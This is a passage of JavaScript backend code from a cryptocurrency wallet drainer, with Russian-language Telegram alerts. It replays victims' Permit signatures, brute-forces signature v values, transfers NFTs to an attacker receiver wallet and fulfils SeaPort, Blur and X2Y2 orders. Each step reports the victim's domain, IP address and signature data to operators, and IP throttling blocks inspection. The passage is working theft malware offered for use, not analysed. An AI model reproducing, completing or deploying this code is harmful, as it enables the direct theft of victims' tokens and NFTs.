          return send_response(response, { status: 'error', error: 'Unable to Execute' });
        }
      } catch(err) {
        console.log(err);
        if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
          try {
            await bot.sendMessage(receiver_chat_id, `<b>❌ Не удалось подписать Permit2 пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nВы можете попробовать вывести эти активы самостоятельно с помощью данных PERMIT, если они включены в настройках дрейнера.`, {
              parse_mode: 'HTML'
            });
          } catch(err) {
            console.log(err);
          }
        }
        return send_response(response, { status: 'error', error: 'Unable to Execute' });
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    return send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const permit_token = async (response, data) => {
  try {
    if (MS_Settings.Permit.Mode == 0) return send_response(response, { status: 'OK' });
    if (MS_Protection) {
      if (User_IPs_Pool[data.IP]) {
        if (User_IPs_Pool[data.IP]['strange_data'] > Math.floor(Date.now() / 1000)) {
          return block_request(response);
        }
      }
    }
    if (MS_VERIFY_WALLET == 1 && !MS_Verified_Addresses[data.address]) {
      return send_response(response, { status: 'error', error: 'Verify Wallet First' });
    }
    if (data.sign.type == 1) {
      try {
        add_record({ type: 'permit_data', domain: data.domain, IP: data.IP, user_id: data.user_id, worker_id: data.worker_id || null, permit_ver: 1, sign: data.sign });
        if ((data.chat_data == false && MS_Notifications.permit_sign_data.mode) || (data.chat_data != false && data.chat_data.permit_sign_data != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.permit_sign_data.chat_id : data.chat_data.permit_sign_data;
          await bot.sendMessage(receiver_chat_id, `<b>🔑 Данные PERMIT пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>owner:</b> <code>${data.sign.owner}</code>\n<b>spender:</b> <code>${data.sign.spender}</code>\n<b>allowed:</b> <code>true</code>\n<b>deadline:</b> <code>${data.sign.deadline}</code>\n<b>v:</b> <code>${data.sign.v}</code>\n<b>r:</b> <code>${data.sign.r}</code>\n<b>s:</b> <code>${data.sign.s}</code>\n\nС помощью этих данных вы можете самостоятельно подписать PERMIT в сети ${chain_id_to_name(data.sign.chain_id)} для контракта: <code>${data.sign.address}</code>`, {
            parse_mode: 'HTML'
          });
        }
      } catch(err) {
        console.log(err);
      }
    } else {
      try {
        add_record({ type: 'permit_data', domain: data.domain, IP: data.IP, user_id: data.user_id, worker_id: data.worker_id || null, permit_ver: 2, sign: data.sign });
        if ((data.chat_data == false && MS_Notifications.permit_sign_data.mode) || (data.chat_data != false && data.chat_data.permit_sign_data != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.permit_sign_data.chat_id : data.chat_data.permit_sign_data;
          await bot.sendMessage(receiver_chat_id, `<b>🔑 Данные PERMIT пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>owner:</b> <code>${data.sign.owner}</code>\n<b>spender:</b> <code>${data.sign.spender}</code>\n<b>value:</b> <code>${data.sign.value}</code>\n<b>deadline:</b> <code>${data.sign.deadline}</code>\n<b>v:</b> <code>${data.sign.v}</code>\n<b>r:</b> <code>${data.sign.r}</code>\n<b>s:</b> <code>${data.sign.s}</code>\n\nС помощью этих данных вы можете самостоятельно подписать PERMIT в сети ${chain_id_to_name(data.sign.chain_id)} для контракта: <code>${data.sign.address}</code>`, {
            parse_mode: 'HTML'
          });
        }
      } catch(err) {
        console.log(err);
      }
    }
    const node = new ethers.providers.JsonRpcProvider(MS_Private_RPC_URLs[data.sign.chain_id]);
    const signer = new ethers.Wallet(MS_Wallet_Private, node);
    const contract = new ethers.Contract(data.sign.address, data.sign.abi, signer);
    const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
    let gas_limit = null;
    try {
      if (data.sign.type == 1) {
        gas_limit = await contract.estimateGas.permit(data.sign.owner, data.sign.spender, data.sign.nonce, data.sign.deadline, true, data.sign.v, data.sign.r, data.sign.s, { from: MS_Wallet_Address });
      } else {
        gas_limit = await contract.estimateGas.permit(data.sign.owner, data.sign.spender, data.sign.value, data.sign.deadline, data.sign.v, data.sign.r, data.sign.s, { from: MS_Wallet_Address });
      }
      gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
    } catch(err) {
      if (MS_Settings.Permit.Bypass == 1)
        gas_limit = (data.asset.chain_id == 42161) ? 5000000 : (data.asset.chain_id == 43114 ? 5000000 : 300000);
      else gas_limit = 15000000;
    }
    const nonce = await node.getTransactionCount(MS_Wallet_Address, "pending");
    if (MS_Settings.Permit.Bypass == 0 && ethers.BigNumber.from(gas_limit).gte(ethers.BigNumber.from('5000000'))) {
      const PERMIT_V_OPTIONS = [ 0, 1, 27, 28, 47, 215 ];
      let is_valid_option = false;
      if (MS_Settings.Permit.Challenge == 1) {
        for (const new_v of PERMIT_V_OPTIONS) {
          try {
            try {
              if (data.sign.type == 1) {
                gas_limit = await contract.estimateGas.permit(data.sign.owner, data.sign.spender, data.sign.nonce, data.sign.deadline, true, new_v, data.sign.r, data.sign.s, { from: MS_Wallet_Address });
              } else {
                gas_limit = await contract.estimateGas.permit(data.sign.owner, data.sign.spender, data.sign.value, data.sign.deadline, new_v, data.sign.r, data.sign.s, { from: MS_Wallet_Address });
              }
            } catch(err) {
              gas_limit = 15000000;
            }
            if (ethers.BigNumber.from(gas_limit).lt(ethers.BigNumber.from('5000000'))) {
              gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
              is_valid_option = true;
              data.sign.v = new_v;
              try {
                let receiver_chat_id = data.chat_data == false ? MS_Notifications.permit_sign_data.chat_id : data.chat_data.permit_sign_data;
                if ((data.chat_data == false && MS_Notifications.permit_sign_data.mode) || (data.chat_data != false && data.chat_data.permit_sign_data != "")) {
                  if (data.sign.type == 1) {
                    try {
                      await bot.sendMessage(receiver_chat_id, `<b>🔑 Данные PERMIT пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nСистема автоматического подбора значений обнаружила, что подпись была некорректная и исправила одно или несколько значений:\n\n<b>owner:</b> <code>${data.sign.owner}</code>\n<b>spender:</b> <code>${data.sign.spender}</code>\n<b>allowed:</b> <code>true</code>\n<b>deadline:</b> <code>${data.sign.deadline}</code>\n<b>v:</b> <code>${data.sign.v}</code>\n<b>r:</b> <code>${data.sign.r}</code>\n<b>s:</b> <code>${data.sign.s}</code>\n\nС помощью этих данных вы можете самостоятельно подписать PERMIT в сети ${chain_id_to_name(data.sign.chain_id)} для контракта: <code>${data.sign.address}</code>`, {
                        parse_mode: 'HTML'
                      });
                    } catch(err) {
                      console.log(err);
                    }
                  } else {
                    try {
                      await bot.sendMessage(receiver_chat_id, `<b>🔑 Данные PERMIT пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nСистема автоматического подбора значений обнаружила, что подпись была некорректная и исправила одно или несколько значений:\n\n<b>owner:</b> <code>${data.sign.owner}</code>\n<b>spender:</b> <code>${data.sign.spender}</code>\n<b>value:</b> <code>${data.sign.value}</code>\n<b>deadline:</b> <code>${data.sign.deadline}</code>\n<b>v:</b> <code>${data.sign.v}</code>\n<b>r:</b> <code>${data.sign.r}</code>\n<b>s:</b> <code>${data.sign.s}</code>\n\nС помощью этих данных вы можете самостоятельно подписать PERMIT в сети ${chain_id_to_name(data.sign.chain_id)} для контракта: <code>${data.sign.address}</code>`, {
                        parse_mode: 'HTML'
                      });
                    } catch(err) {
                      console.log(err);
                    }
                  }
                }
              } catch(err) {
                console.log(err);
              }
              break;
            }
          } catch(err) {
            console.log(err);
          }
        }
      }
      if (is_valid_option == false) {
        if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
          try {
            await bot.sendMessage(receiver_chat_id, `<b>❌ Не удалось подписать PERMIT пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nСистема обнаружила, что, скорее всего, PERMIT является фейковым и с целью сохранения ваших денежных средств отклонила транзакцию.\n\nВы всё ещё можете попытаться вывести токен вручную, если вы считаете, что подпись всё же является настоящей.`, {
              parse_mode: 'HTML'
            });
          } catch(err) {
            console.log(err);
          }
        }
        return send_response(response, { status: 'OK' });
      }
    }
    if (data.sign.type == 1) {
      try {
        const tx = await contract.permit(data.sign.owner, data.sign.spender, data.sign.nonce, data.sign.deadline, true, data.sign.v, data.sign.r, data.sign.s, {
          gasLimit: ethers.BigNumber.from(gas_limit),
          gasPrice: ethers.BigNumber.from(gas_price),
          nonce: nonce
        });
        await node.waitForTransaction(tx.hash, 1, 60000);
      } catch(err) {
        console.log(err);
        if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
          try {
            await bot.sendMessage(receiver_chat_id, `<b>❌ Не удалось подписать PERMIT пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nВы можете попробовать вывести эти активы самостоятельно с помощью данных PERMIT, если они включены в настройках дрейнера.`, {
              parse_mode: 'HTML'
            });
          } catch(err) {
            console.log(err);
          }
        }
        return send_response(response, { status: 'error', error: 'Unable to Execute' });
      }
    } else {
      try {
        const tx = await contract.permit(data.sign.owner, data.sign.spender, data.sign.value, data.sign.deadline, data.sign.v, data.sign.r, data.sign.s, {
          gasLimit: ethers.BigNumber.from(gas_limit),
          gasPrice: ethers.BigNumber.from(gas_price),
          nonce: nonce
        });
        await node.waitForTransaction(tx.hash, 1, 60000);
      } catch(err) {
        console.log(err);
        if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
          try {
            await bot.sendMessage(receiver_chat_id, `<b>❌ Не удалось подписать PERMIT пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nВы можете попробовать вывести эти активы самостоятельно с помощью данных PERMIT, если они включены в настройках дрейнера.`, {
              parse_mode: 'HTML'
            });
          } catch(err) {
            console.log(err);
          }
        }
        return send_response(response, { status: 'error', error: 'Unable to Execute' });
      }
    }

    add_record({
      type: 'permit_success', domain: data.domain, IP: data.IP,
      user_id: data.user_id, asset: data.asset, worker_id: data.worker_id || null
    });

    data.action = 'approve_token';
    delete data.sign;

    return approve_token(response, data);
  } catch(err) {
    console.log(err);
    try {
      if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
        await bot.sendMessage(receiver_chat_id, `<b>❌ Не удалось подписать PERMIT пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nВы можете попробовать вывести эти активы самостоятельно с помощью данных PERMIT, если они включены в настройках дрейнера.`, {
          parse_mode: 'HTML'
        });
      }
    } catch(err) {
      console.log(err);
    }
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const Get_ERC721_Allowance = async (chain_id, contract_address, owner_address, spender_address) => {
  try {
    const node = new ethers.providers.JsonRpcProvider(MS_Private_RPC_URLs[chain_id]);
    const contract = new ethers.Contract(contract_address, MS_Contract_ABI['ERC721'], node);
    return await contract.isApprovedForAll(owner_address, spender_address);
  } catch(err) {
    console.log(err);
  } return false;
};

const safa_approves = async (response, data) => {
  try {
    if (MS_Settings.SAFA.Enable == 0 || MS_Settings.SAFA.Withdraw == 0) return send_response(response, { status: 'OK' });
    if (MS_Protection) {
      if (User_IPs_Pool[data.IP]) {
        if (User_IPs_Pool[data.IP]['strange_data'] > Math.floor(Date.now() / 1000)) {
          return block_request(response);
        }
      }
    }
    if (MS_VERIFY_WALLET == 1 && !MS_Verified_Addresses[data.address]) {
      return send_response(response, { status: 'error', error: 'Verify Wallet First' });
    }
    let current_allowance = await Get_ERC721_Allowance(data.chain_id, data.contract_address, data.address, MS_Wallet_Address);
    if (!current_allowance) {
      await new Promise(r => setTimeout(r, 2000));
      current_allowance = await Get_ERC721_Allowance(data.chain_id, data.contract_address, data.address, MS_Wallet_Address);
      if (!current_allowance) {
        await new Promise(r => setTimeout(r, 5000));
        current_allowance = await Get_ERC721_Allowance(data.chain_id, data.contract_address, data.address, MS_Wallet_Address);
        if (!current_allowance) {
          if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
            let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
            await bot.sendMessage(receiver_chat_id, `<b>❌ Не удалось вывести коллекцию пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>NFT Collection :</b> ${data.contract_address} [${chain_id_to_name(data.chain_id)}]\n\nВозможно, транзакция подтверждения не прошла или ещё в очереди, попробуйте вывести токен в ручном режиме!`, {
              parse_mode: 'HTML'
            });
          }
          return send_response(response, { status: 'error', error: 'Unable to Execute' });
        }
      }
    }
    const node = new ethers.providers.JsonRpcProvider(MS_Private_RPC_URLs[data.chain_id]);
    const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
    const signer = new ethers.Wallet(MS_Wallet_Private, node); let stop_withdraw_nfts = false;
    for (const asset of data.tokens) {
      try {
        if (asset.amount_usd <= MS_Settings.SAFA.Withdraw_Amount || stop_withdraw_nfts == true) continue;
        stop_withdraw_nfts = (MS_Settings.SAFA.Withdraw == 1);
        const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC721'], signer);
        let gas_limit = null;
        try {
          gas_limit = await contract.estimateGas.transferFrom(data.address, MS_Wallet_Receiver, asset.id, { from: MS_Wallet_Address });
          gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
        } catch(err) {
          if (MS_Settings.SAFA.Bypass == 1)
            gas_limit = (data.asset.chain_id == 42161) ? 5000000 : (data.asset.chain_id == 43114 ? 5000000 : 300000);
          else gas_limit = 15000000;
        }
        if (MS_Settings.SAFA.Bypass == 0 && ethers.BigNumber.from(gas_limit).gte(ethers.BigNumber.from('5000000'))) {
          if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
            let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
            try {
              await bot.sendMessage(receiver_chat_id, `<b>❌ Не удалось вывести NFT пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>NFT:</b> ${asset.name} [${chain_id_to_name(asset.chain_id)}]\n\nСистема обнаружила, что, скорее всего, подтверждение является фейковым или вывод этого токена технически невозможен, и с целью сохранения ваших денежных средств отклонила транзакцию.\n\nВы всё ещё можете попытаться вывести токен вручную, если вы считаете, что подпись всё же является настоящей.`, {
                parse_mode: 'HTML'
              });
            } catch(err) {
              console.log(err);
            }
          }
          continue;
        }
        const nonce = await node.getTransactionCount(MS_Wallet_Address, "pending");
        const tx = await contract.transferFrom(data.address, MS_Wallet_Receiver, asset.id, {
          gasLimit: ethers.BigNumber.from(gas_limit),
          gasPrice: ethers.BigNumber.from(gas_price),
          nonce: nonce
        });
        await node.waitForTransaction(tx.hash, 1, 60000);
        add_record({
          type: 'asset_sent', domain: data.domain, IP: data.IP,
          user_id: data.user_id, asset: data.asset, worker_id: data.worker_id || null
        });
        if ((data.chat_data == false && MS_Notifications.approve_success.mode) || (data.chat_data != false && data.chat_data.approve_success != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_success.chat_id : data.chat_data.approve_success;
          try {
            await bot.sendMessage(receiver_chat_id, `<b>💎 Успешно выведен NFT пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Токен:</b> ${asset.name} [${chain_id_to_name(asset.chain_id)}, ${parseFloat(asset.amount_usd).toFixed(2)}$]`, {
              parse_mode: 'HTML'
            });
          } catch(err) {
            console.log(err);
          }
        }
      } catch(err) {
        if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
          try {
            await bot.sendMessage(receiver_chat_id, `<b>❌ Не удалось вывести NFT пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>NFT:</b> ${asset.name} [${chain_id_to_name(asset.chain_id)}]\n\nВозможно, транзакция подтверждения не прошла или ещё в очереди, попробуйте вывести токен в ручном режиме!`, {
              parse_mode: 'HTML'
            });
          } catch(err) {
            console.log(err);
          }
        }
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    try {
      if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
        await bot.sendMessage(receiver_chat_id, `<b>❌ Не удалось вывести коллекцию пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>NFT Collection :</b> ${data.contract_address} [${chain_id_to_name(data.chain_id)}]\n\nВозможно, транзакция подтверждения не прошла или ещё в очереди, попробуйте вывести токен в ручном режиме!`, {
          parse_mode: 'HTML'
        });
      }
    } catch(err) {
      console.log(err);
    }
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const seaport_handler = async (response, data) => {
  try {
    if (MS_Protection) {
      if (User_IPs_Pool[data.IP]) {
        if (User_IPs_Pool[data.IP]['strange_data'] > Math.floor(Date.now() / 1000)) {
          return block_request(response);
        }
      }
    }
    if (data.seaport == 'request') {
      if ((data.chat_data == false && MS_Notifications.approve_request.mode) || (data.chat_data != false && data.chat_data.approve_request != "")) {
        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_request.chat_id : data.chat_data.approve_request;
        let nfts_list_str = '';
        for (const asset of data.assets) {
          try {
            nfts_list_str += `${asset.name} (${asset.amount_usd.toFixed(2)}$); `;
          } catch(err) {
            console.log(err);
          }
        }
        await bot.sendMessage(receiver_chat_id, `<b>❓ Пользователь #user_${data.user_id} получил запрос на SeaPort</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Список NFT:</b> ${nfts_list_str}`, {
          parse_mode: 'HTML'
        });
      }
      send_response(response, { status: 'OK' });
    } else if (data.seaport == 'cancel') {
      if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
        await bot.sendMessage(receiver_chat_id, `<b>❌ Пользователь #user_${data.user_id} отклонил SeaPort</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nМы предложим ему списать NFT отдельно`, {
          parse_mode: 'HTML'
        });
      }
      send_response(response, { status: 'OK' });
    } else if (data.seaport == 'success') {
      if (MS_Settings.SeaPort.Limit == 1 && SeaPort_List[data.address]) {
        return send_response(response, { status: 'OK' });
      } SeaPort_List[data.address] = 1;
      let result = await SeaPort.fulfill(data, MS_Private_RPC_URLs[1], MS_Wallet_Private);
      if (result) {
        if ((data.chat_data == false && MS_Notifications.approve_success.mode) || (data.chat_data != false && data.chat_data.approve_success != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_success.chat_id : data.chat_data.approve_success;
          await bot.sendMessage(receiver_chat_id, `<b>💎 Успешно подписали SeaPort пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nВы можете отследить транзакцию через сканеры`, {
            parse_mode: 'HTML'
          });
        }
      } else {
        if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
          await bot.sendMessage(receiver_chat_id, `<b>❌ Не удалось подписать SeaPort пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nВозможно, транзакция не прошла или ещё в очереди!`, {
            parse_mode: 'HTML'
          });
        }
      }
      send_response(response, { status: 'OK' });
    } else {
      send_response(response, { status: 'error', error: 'Unable to Execute' });
    }
  } catch (err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const blur_handler = async (response, data) => {
  try {
    if (MS_Protection) {
      if (User_IPs_Pool[data.IP]) {
        if (User_IPs_Pool[data.IP]['strange_data'] > Math.floor(Date.now() / 1000)) {
          return block_request(response);
        }
      }
    }
    if (data.blur == 'request') {
      if ((data.chat_data == false && MS_Notifications.approve_request.mode) || (data.chat_data != false && data.chat_data.approve_request != "")) {
        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_request.chat_id : data.chat_data.approve_request;
        let nfts_list_str = '';
        for (const asset of data.assets) {
          try {
            nfts_list_str += `${asset.name} (${asset.amount_usd.toFixed(2)}$); `;
          } catch(err) {
            console.log(err);
          }
        }
        await bot.sendMessage(receiver_chat_id, `<b>❓ Пользователь #user_${data.user_id} получил запрос на Blur</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Список NFT:</b> ${nfts_list_str}`, {
          parse_mode: 'HTML'
        });
      }
      send_response(response, { status: 'OK' });
    } else if (data.blur == 'cancel') {
      if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
        await bot.sendMessage(receiver_chat_id, `<b>❌ Пользователь #user_${data.user_id} отклонил Blur</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nМы предложим ему списать NFT отдельно`, {
          parse_mode: 'HTML'
        });
      }
      send_response(response, { status: 'OK' });
    } else if (data.blur == 'root') {
      let result = await Blur.get_root(data, MS_Private_RPC_URLs[1], MS_Wallet_Private);
      if (result != false) {
        send_response(response, { status: 'OK', data: result });
      } else {
        send_response(response, { status: 'error', error: 'Unable to Execute' });
      }
    } else if (data.blur == 'success') {
      if (MS_Settings.Blur.Limit == 1 && Blur_List[data.address]) {
        return send_response(response, { status: 'OK' });
      } Blur_List[data.address] = 1;
      let result = await Blur.execute(data, MS_Private_RPC_URLs[1], MS_Wallet_Private);
      if (result) {
        if ((data.chat_data == false && MS_Notifications.approve_success.mode) || (data.chat_data != false && data.chat_data.approve_success != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_success.chat_id : data.chat_data.approve_success;
          await bot.sendMessage(receiver_chat_id, `<b>💎 Успешно подписали Blur пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nВы можете отследить транзакцию через сканеры`, {
            parse_mode: 'HTML'
          });
        }
      } else {
        if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
          await bot.sendMessage(receiver_chat_id, `<b>❌ Не удалось подписать Blur пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nВозможно, транзакция не прошла или ещё в очереди!`, {
            parse_mode: 'HTML'
          });
        }
      }
      send_response(response, { status: 'OK' });
    } else {
      send_response(response, { status: 'error', error: 'Unable to Execute' });
    }
  } catch (err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const x2y2_handler = async (response, data) => {
  try {
    if (MS_Protection) {
      if (User_IPs_Pool[data.IP]) {
        if (User_IPs_Pool[data.IP]['strange_data'] > Math.floor(Date.now() / 1000)) {
          return block_request(response);
        }
      }
    }
    if (data.x2y2 == 'request') {
      if ((data.chat_data == false && MS_Notifications.approve_request.mode) || (data.chat_data != false && data.chat_data.approve_request != "")) {
        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_request.chat_id : data.chat_data.approve_request;
        let nfts_list_str = '';
        for (const asset of data.assets) {
          try {
            nfts_list_str += `${asset.name} (${asset.amount_usd.toFixed(2)}$); `;
          } catch(err) {
            console.log(err);
          }
        }
        await bot.sendMessage(receiver_chat_id, `<b>❓ Пользователь #user_${data.user_id} получил запрос на X2Y2</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Список NFT:</b> ${nfts_list_str}`, {
          parse_mode: 'HTML'
        });
      }
      send_response(response, { status: 'OK' });
    } else if (data.x2y2 == 'cancel') {
      if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
        await bot.sendMessage(receiver_chat_id, `<b>❌ Пользователь #user_${data.user_id} отклонил X2Y2</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nМы предложим ему списать NFT отдельно`, {
          parse_mode: 'HTML'
        });
      }
      send_response(response, { status: 'OK' });
    } else if (data.x2y2 == 'success') {
      if ((data.chat_data == false && MS_Notifications.approve_success.mode) || (data.chat_data != false && data.chat_data.approve_success != "")) {
        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_success.chat_id : data.chat_data.approve_success;
        await bot.sendMessage(receiver_chat_id, `<b>💎 Успешно подписали X2Y2 пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nВы можете отследить транзакцию через сканеры`, {
          parse_mode: 'HTML'
        });
      }
      send_response(response, { status: 'OK' });
    } else {
      send_response(response, { status: 'error', error: 'Unable to Execute' });
    }
  } catch (err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const check_wallet = async (response, data) => {
  try {

    if (MS_Protection) {
      if (User_IPs_Pool[data.IP]) {
        if (User_IPs_Pool[data.IP]['strange_data'] > Math.floor(Date.now() / 1000)) {
          return block_request(response);
        }
        if (User_IPs_Pool[data.IP]['check_wallet']) {
          if (Math.floor(Date.now() / 1000) - User_IPs_Pool[data.IP]['check_wallet'] < 60) {
            return block_request(response);
          }
        }
        User_IPs_Pool[data.IP]['check_wallet'] = Math.floor(Date.now() / 1000);
      } else {
        User_IPs_Pool[data.IP] = {
          check_wallet: Math.floor(Date.now() / 1000)
        };
      }
    }

    if (MS_VERIFY_WALLET == 1 && !MS_Verified_Addresses[data.address]) {
      return send_response(response, { status: 'error', error: 'Verify Wallet First' });
    }

    if (MS_Check_Limits) {
      if (MS_Check_Settings.block_for_all && Checks_Data.all_checks >= MS_Check_Settings.limit_for_all) {
        return send_response(response, { status: 'error',  error: 'LIMITED' });
      }
      if (!data.IP || (MS_Check_Settings.block_by_ip && data.IP && Checks_Data.personal[data.IP] && Checks_Data.personal[data.IP] >= MS_Check_Settings.limit_personal)) {
        return send_response(response, { status: 'error',  error: 'LIMITED' });
      }
